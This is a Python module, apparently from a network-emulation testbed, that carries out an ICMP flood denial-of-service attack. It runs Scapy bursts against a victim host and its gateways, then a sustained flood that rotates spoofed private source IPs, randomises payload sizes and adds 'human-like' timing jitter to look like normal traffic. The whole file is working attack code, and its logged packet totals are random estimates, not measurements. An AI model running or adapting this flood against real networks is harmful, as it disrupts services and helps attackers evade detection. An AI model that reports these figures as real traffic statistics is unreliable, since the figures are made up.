"""
Enhanced ICMP Flood Attack with IP Rotation
Integrates source IP rotation capability from mainv2.py
"""
import time
import subprocess
import signal
import logging
import uuid
import threading
# Optional psutil import - gracefully handle if missing
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
import random
from scapy.all import Ether, IP, ICMP, sendp, sr1

# Import enhanced timing and protocol compliance modules
try:
    from .enhanced_timing import HumanLikeTiming, NetworkDelaySimulator
    from .protocol_compliance import ProtocolValidator
except ImportError:
    try:
        from enhanced_timing import HumanLikeTiming, NetworkDelaySimulator
        from protocol_compliance import ProtocolValidator
    except ImportError:
        # Fallback implementations if modules are not available
        class HumanLikeTiming:
            def get_session_pattern(self, duration_minutes=1):
                return [{'start_time': 0, 'duration': duration_minutes*60, 'type': 'normal', 'intensity': 1.0}]
            def get_circadian_factor(self, hour):
                return 1.0
            def get_workday_pattern(self):
                return 1.0

        class NetworkDelaySimulator:
            def __init__(self):
                pass

        class ProtocolValidator:
            def __init__(self):
                pass

# Suppress Scapy warnings
import warnings
warnings.filterwarnings("ignore", message="Mac address to reach destination not found.*")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configure logging for this module
attack_logger = logging.getLogger('attack_logger')

class ICMPIPRotator:
    """RFC 1918 private IP rotation for ICMP flood attacks"""
    
    def __init__(self):
        # RFC 1918 private IP address ranges for realistic IP rotation
        self.ip_ranges = {
            '10.0.0.0/8': ('10.0.0.1', '10.255.255.254'),
            '172.16.0.0/12': ('172.16.0.1', '172.31.255.254'), 
            '192.168.0.0/16': ('192.168.0.1', '192.168.255.254')
        }
        # Pre-generate a pool of random IPs for consistent rotation
        self.ip_pool = self._generate_ip_pool(50)  # Generate 50 random IPs
        self.current_index = 0
    
    def _generate_ip_pool(self, count):
        """Generate a pool of random RFC 1918 private IPs"""
        ip_pool = []
        for _ in range(count):
            ip_pool.append(self._generate_random_ip())
        return ip_pool
    
    def _generate_random_ip(self):
        """Generate random IP from RFC 1918 private ranges"""
        # Select random range
        range_choice = random.choice(list(self.ip_ranges.keys()))
        
        if range_choice == '10.0.0.0/8':
            # 10.x.x.x
            return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif range_choice == '172.16.0.0/12':
            # 172.16-31.x.x
            return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:  # 192.168.0.0/16
            # 192.168.x.x
            return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    def get_next_ip(self):
        """Get next IP in rotation"""
        ip = self.ip_pool[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.ip_pool)
        return ip
    
    def get_random_ip(self):
        """Get random IP from pool"""
        return random.choice(self.ip_pool)
    
    def get_fresh_random_ip(self):
        """Generate a fresh random IP (not from pre-generated pool)"""
        return self._generate_random_ip()

def run_attack(attacker_host, victim_ip, duration):
    """Enhanced ICMP flood attack with IP rotation"""
    run_id = str(uuid.uuid4())
    start_time = time.time()
    
    # Initialize enhanced timing, protocol compliance, and IP rotation
    timing_engine = HumanLikeTiming()
    network_sim = NetworkDelaySimulator()
    protocol_validator = ProtocolValidator()
    ip_rotator = ICMPIPRotator()
    
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Starting Enhanced ICMP Flood with RFC 1918 IP Rotation from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack Phase: Enhanced Traditional ICMP Flood - Attacker: {attacker_host.name}, Target: {victim_ip}, Duration: {duration}s")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Enhanced Features: RFC 1918 IP rotation, human-like timing, protocol compliance, network delay simulation")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] IP Pool Size: {len(ip_rotator.ip_pool)} source IPs from RFC 1918 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)")
    
    # (Pre-attack reachability check removed to avoid root-namespace timeouts)
    
    # Phase A: High-intensity stress burst (no think time) for ~30% of duration
    stress_duration = max(1, int(duration * 0.3))
    advanced_duration = max(1, duration - stress_duration)
    # Split stress into host-stress and gateway-stress to exercise controller
    stress_host = max(1, stress_duration // 2)
    stress_gw = max(1, stress_duration - stress_host)
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Stress phase total: {stress_duration}s (host: {stress_host}s, gateway: {stress_gw}s), Advanced phase: {advanced_duration}s")

    # Host stress burst (victim host)
    stress_host_cmd = f"""
import time
from scapy.all import *

def icmp_stress_host():
    iface = '{attacker_host.intfNames()[0]}'
    target_ip = '{victim_ip}'
    end_ts = time.time() + {stress_host}
    while time.time() < end_ts:
        pkt = Ether()/IP(dst=target_ip)/ICMP()
        sendp(pkt, iface=iface, verbose=0)

icmp_stress_host()
"""
    stress_proc_host = attacker_host.popen(['python3', '-c', stress_host_cmd])
    try:
        stress_proc_host.wait(timeout=stress_host + 5)
    except Exception:
        try:
            stress_proc_host.terminate()
        except Exception:
            pass
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Host stress sub-phase completed")

    # Gateway stress burst (controller stress via gateway echo handling)
    gateway_ips = ["192.168.10.1", "192.168.20.1", "192.168.30.1"]
    gw_list_str = str(gateway_ips)
    stress_gw_cmd = f"""
import time, random
from scapy.all import *

def icmp_stress_gw():
    iface = '{attacker_host.intfNames()[0]}'
    gateways = {gw_list_str}
    end_ts = time.time() + {stress_gw}
    i = 0
    while time.time() < end_ts:
        dst = gateways[i % len(gateways)]
        i += 1
        pkt = Ether()/IP(dst=dst)/ICMP()
        sendp(pkt, iface=iface, verbose=0)

icmp_stress_gw()
"""
    stress_proc_gw = attacker_host.popen(['python3', '-c', stress_gw_cmd])
    try:
        stress_proc_gw.wait(timeout=stress_gw + 5)
    except Exception:
        try:
            stress_proc_gw.terminate()
        except Exception:
            pass
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Gateway stress sub-phase completed")

    # Reset timer for advanced phase and adjust duration
    start_time = time.time()
    duration = advanced_duration

    # Generate session pattern for realistic attack behavior
    session_pattern = timing_engine.get_session_pattern(duration_minutes=duration/60)
    current_hour = time.localtime().tm_hour
    circadian_factor = timing_engine.get_circadian_factor(current_hour)
    workday_factor = timing_engine.get_workday_pattern()
    
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Session pattern: {len(session_pattern)} phases, Circadian factor: {circadian_factor:.2f}, Workday factor: {workday_factor:.2f}")
    
    # Create IP rotation data for the attack script
    ip_pool_str = str(ip_rotator.ip_pool)
    ip_ranges_str = str(ip_rotator.ip_ranges)
    
    # Start enhanced ICMP flood with IP rotation and human-like timing
    attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Starting enhanced ICMP packet generation with IP rotation and human-like timing")
    
    # Create enhanced attack process with RFC 1918 IP rotation
    enhanced_scapy_cmd = f"""
import time
import random
from scapy.all import *

def enhanced_icmp_flood_with_rfc1918_rotation():
    interface = '{attacker_host.intfNames()[0]}'
    target_ip = '{victim_ip}'
    base_interval = 0.01
    
    # RFC 1918 IP rotation pool (pre-generated)
    ip_pool = {ip_pool_str}
    current_ip_index = 0
    
    # RFC 1918 ranges for fresh IP generation
    def generate_fresh_rfc1918_ip():
        ranges = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']
        range_choice = random.choice(ranges)
        
        if range_choice == '10.0.0.0/8':
            return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif range_choice == '172.16.0.0/12':
            return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:  # 192.168.0.0/16
            return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    # Human-like timing variations
    typing_intervals = [0.08, 0.12, 0.15, 0.09, 0.11, 0.13, 0.10, 0.14]
    
    packet_count = 0
    ip_rotation_count = 0
    fresh_ip_count = 0
    
    while True:
        try:
            # IP rotation strategy
            if packet_count % random.randint(10, 20) == 0:
                # 70% chance to use pool IP, 30% chance to generate fresh RFC 1918 IP
                if random.random() < 0.7:
                    current_ip_index = (current_ip_index + 1) % len(ip_pool)
                    current_src_ip = ip_pool[current_ip_index]
                else:
                    current_src_ip = generate_fresh_rfc1918_ip()
                    fresh_ip_count += 1
                ip_rotation_count += 1
            else:
                current_src_ip = ip_pool[current_ip_index]
            
            # Create ICMP packet with rotating RFC 1918 source IP and random payload
            icmp_id = random.randint(1, 65535)
            icmp_seq = packet_count % 65536
            
            # Add random payload to vary packet size (0-1400 bytes)
            payload_size = random.randint(0, 1400)
            if payload_size > 0:
                # Generate random payload data
                payload_data = bytes([random.randint(0, 255) for _ in range(payload_size)])
                packet = Ether()/IP(src=current_src_ip, dst=target_ip)/ICMP(id=icmp_id, seq=icmp_seq)/Raw(load=payload_data)
            else:
                packet = Ether()/IP(src=current_src_ip, dst=target_ip)/ICMP(id=icmp_id, seq=icmp_seq)
            sendp(packet, iface=interface, verbose=0)
            
            packet_count += 1
            
            # Apply human-like timing with variations
            if packet_count % 50 == 0:  # Occasional think time
                think_time = random.uniform(0.5, 2.0)
                time.sleep(think_time)
            else:
                # Use typing-like intervals with network delay simulation
                interval = random.choice(typing_intervals) * random.uniform(0.8, 1.2)
                # Add network congestion simulation
                if random.random() < 0.05:  # 5% chance of congestion
                    interval *= random.uniform(2.0, 4.0)
                time.sleep(max(0.005, interval))
        
        except Exception as e:
            break

enhanced_icmp_flood_with_rfc1918_rotation()
"""
    
    process = attacker_host.popen(['python3', '-c', enhanced_scapy_cmd])
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Enhanced ICMP flood with IP rotation process started (PID: {process.pid})")
    
    # Enhanced monitoring with session pattern awareness
    packets_sent = 0
    monitoring_interval = max(1, duration // 5)
    next_monitor = time.time() + monitoring_interval
    phase_index = 0
    current_phase = session_pattern[0] if session_pattern else None
    
    while time.time() - start_time < duration:
        current_time = time.time()
        elapsed = current_time - start_time
        
        # Check if we need to move to next session phase
        if current_phase and elapsed >= current_phase['start_time'] + current_phase['duration']:
            phase_index += 1
            if phase_index < len(session_pattern):
                current_phase = session_pattern[phase_index]
                attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Entering {current_phase['type']} phase (intensity: {current_phase['intensity']:.2f})")
        
        if current_time >= next_monitor:
            # Estimate packets sent with enhanced timing considerations
            base_rate = random.uniform(20, 30)  # Randomized rate with enhanced timing (+/-20%)
            if current_phase:
                adjusted_rate = base_rate * current_phase['intensity'] * circadian_factor * workday_factor
            else:
                adjusted_rate = base_rate * circadian_factor * workday_factor
            
            estimated_packets = int(elapsed * adjusted_rate)
            estimated_ip_rotations = estimated_packets // 15  # Average rotation every 15 packets
            packets_sent = estimated_packets
            
            # Monitor process status with enhanced metrics
            try:
                if process.poll() is None:
                    proc_info = psutil.Process(process.pid)
                    cpu_percent = proc_info.cpu_percent()
                    memory_mb = proc_info.memory_info().rss / 1024 / 1024
                    
                    phase_info = f", Phase: {current_phase['type']} (intensity: {current_phase['intensity']:.2f})" if current_phase else ""
                    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack progress: {elapsed:.1f}s elapsed, ~{estimated_packets} packets sent, Rate: {estimated_packets/elapsed:.1f} pps, IP rotations: ~{estimated_ip_rotations}{phase_info}")
                    attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Process stats - CPU: {cpu_percent:.1f}%, Memory: {memory_mb:.1f}MB")
                    attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Timing factors - Circadian: {circadian_factor:.2f}, Workday: {workday_factor:.2f}, Adjusted rate: {adjusted_rate:.1f} pps")
                else:
                    attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Attack process terminated unexpectedly")
                    break
            except Exception as e:
                attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Unable to get process stats: {e}")
            
            next_monitor = current_time + monitoring_interval
        
        # Enhanced sleep with slight randomization
        sleep_time = random.uniform(0.08, 0.12)
        time.sleep(sleep_time)
    
    # Stop the attack
    stop_time = time.time()
    actual_duration = stop_time - start_time
    
    try:
        if process.poll() is None:
            process.send_signal(signal.SIGINT)
            attack_logger.debug(f"[icmp_flood] [Run ID: {run_id}] Sent SIGINT to ICMP flood process {process.pid}")
            time.sleep(0.5)
        
        if process.poll() is None:
            process.terminate()
            attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Force terminated ICMP flood process {process.pid}")
    except Exception as e:
        attack_logger.warning(f"[icmp_flood] [Run ID: {run_id}] Error stopping attack process: {e}")
    
    process.wait()
    
    # Calculate enhanced final statistics
    base_rate = random.uniform(20, 30)  # Randomized enhanced timing rate (+/-20%)
    effective_rate = base_rate * circadian_factor * workday_factor
    final_packets_sent = int(actual_duration * effective_rate)
    final_ip_rotations = final_packets_sent // 15  # Average rotation every 15 packets
    avg_rate = final_packets_sent / actual_duration if actual_duration > 0 else 0
    
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Enhanced ICMP Flood with RFC 1918 IP Rotation from {attacker_host.name} to {victim_ip} finished.")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack completed. Total packets sent = {final_packets_sent}, Average rate = {avg_rate:.2f} packets/sec.")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] --- Enhanced Attack Summary ---")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Total packets sent: {final_packets_sent}")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Total IP rotations: ~{final_ip_rotations}")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] RFC 1918 IP pool size: {len(ip_rotator.ip_pool)}")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] IP ranges used: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Actual duration: {actual_duration:.2f}s")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Average rate: {avg_rate:.2f} packets/sec")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Base rate: {base_rate:.1f} pps")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Circadian factor: {circadian_factor:.2f}")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Workday factor: {workday_factor:.2f}")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Session phases: {len(session_pattern)}")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] ICMP type: Echo Request (8) with ID/Seq variations")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Attack method: Enhanced ICMP Flood with RFC 1918 IP Rotation")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] Enhancement features: RFC 1918 IP rotation, human timing patterns, protocol compliance, network delay simulation")
    attack_logger.info(f"[icmp_flood] [Run ID: {run_id}] ----------------------------------------")
    
    return process

def run_attack_with_rotation(attacker_host, victim_ip, duration):
    """Wrapper function for enhanced ICMP flood with IP rotation"""
    return run_attack(attacker_host, victim_ip, duration)
